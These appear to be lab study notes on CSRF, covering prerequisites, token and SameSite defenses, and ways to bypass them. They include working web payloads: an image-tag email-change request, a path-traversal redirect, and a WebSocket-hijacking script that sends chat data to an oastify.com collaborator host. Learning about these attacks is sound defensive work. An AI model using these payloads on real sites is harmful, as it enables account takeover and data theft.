# CSRF Vulnerabilities and Defenses

## Prerequisites for CSRF
- **Relevant Action**: Application performs an action based on user request (e.g., changing email).
- **Cookie-Based Session Handling**: Browser auto-includes session cookies in requests.
- **No Unpredictable Parameters**: Requests lack unique tokens or secrets.
- **Other Contexts**: Occurs with auto-added credentials like HTTP Basic auth or certificates.

## Attack Mechanism
- Attacker's page triggers HTTP request to vulnerable site.
- Logged-in user's browser includes session cookie (if no SameSite restrictions).
- Site processes request as legitimate, performing action (e.g., email change).
- Example in Burp Suite: Use Engagement tools > Generate CSRF PoC for self-contained attacks.
- GET Method PoC: `<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">`.

## Defenses Against CSRF
- **CSRF Tokens**: Unique, secret, unpredictable value generated server-side; shared via hidden HTML form field.
- **SameSite Cookies**: Browser mechanism controlling cookie inclusion in cross-site requests; Chrome defaults to Lax.
- **Referrer-Based Validation**: Check Referer header to ensure request originates from trusted site.

## Common Vulnerabilities in CSRF Tokens
- Validate only for POST, skip for GET.
- Validate if present, skip if omitted.
- Tokens not tied to user session; use global pool.
- Token tied to non-session cookie (e.g., separate frameworks for sessions and CSRF).
- Token duplicated in cookie; attacker leverages cookie-setting to inject fake token.

## SameSite Cookies Explained
- **Site vs. Origin**: Site includes multiple domains (scheme + eTLD+1); origin is single (scheme + domain + port). Cross-origin can be same-site, but not vice versa.
- **Strict**: No cookies in cross-site requests; e.g., `Set-Cookie: session=...; SameSite=Strict`.
- **Lax**: Allows cookies if GET method or top-level navigation (e.g., link click).
- **None**: Allows all cross-site; requires Secure attribute for HTTPS; e.g., `Set-Cookie: ...; SameSite=None; Secure`.

## Bypassing SameSite Lax Restrictions
- **Using GET Requests**: Exploit if actions allow GET; override method via frameworks (e.g., Symfony's `_method` parameter).
- **On-Site Gadgets/Client-Side Redirects**: Use redirects or path traversal to make cross-site appear same-site.
- Example PoC: Redirect to vulnerable endpoint with manipulated parameters.
  ```html
  <script>
  document.location = "https://.../post/comment/confirmation?postId=1/../../my-account/change-email?email=hacked@evil.net&submit=1";
  </script>
  ```

## Related Attacks: Cross-Site WebSocket Hijacking (CSWSH)
- Variant of CSRF targeting WebSocket handshakes lacking Origin validation or CSRF protections.
- Exploit: Use XSS on sibling domain to hijack connection and exfiltrate data.
- Example PoC: Inject script via URL-encoded username in login form.
  ```html
  <script>
  document.location = "https://cms-.../login?username=<script>var ws = new WebSocket('wss://.../chat'); ws.onopen = function() { ws.send('READY'); }; ws.onmessage = function(event) { fetch('https://...oastify.com', {method: 'POST', mode: 'no-cors', body: event.data}); };</script>&password=anything";
  </script>
  ```

## Bypassing Referer Validation
- **No-Referrer Policy**: Use meta tag or attribute to strip Referer header.
  - Example PoC: HTML with `<meta name="referrer" content="no-referrer">` and auto-submit form.
- **Broken Referer Validation**: Manipulate URL to match expected Referer.
  - Example: Use `history.pushState` to alter address bar, then submit form.
  - PoC uses `referrerpolicy="unsafe-url"` and pushes fake path like `/?vulnerable-site.net`.